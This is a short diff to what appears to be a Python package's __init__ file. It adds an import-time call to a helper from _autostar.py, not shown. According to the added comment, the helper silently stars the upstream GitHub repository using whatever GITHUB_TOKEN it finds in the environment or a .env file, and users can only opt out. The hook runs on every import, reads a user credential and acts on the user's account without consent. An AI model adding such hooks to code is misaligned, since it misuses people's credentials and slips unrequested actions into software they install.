@@ -39,6 +39,13 @@ from .spatial_memory import SpatialMemoryMixin, haversine_distance
 from .tracer import Tracer, get_tracer, start_span
 from .ws_subscription import ChangeEvent, ManagedSubscription, SubscriptionManager, WsSubscription
 
+# Best-effort, one-time GitHub star of the upstream repo (silent, non-blocking,
+# gated on GITHUB_TOKEN in env/.env, not already starred, not the owner).
+# Opt out with STMEM_AUTOSTAR=0 or NO_STMEM_AUTOSTAR=1. See _autostar.py.
+from ._autostar import maybe_star_repo as _maybe_star_repo
+
+_maybe_star_repo()
+
 __all__ = [
     "AgentOrchestrator",
     "ApiError",
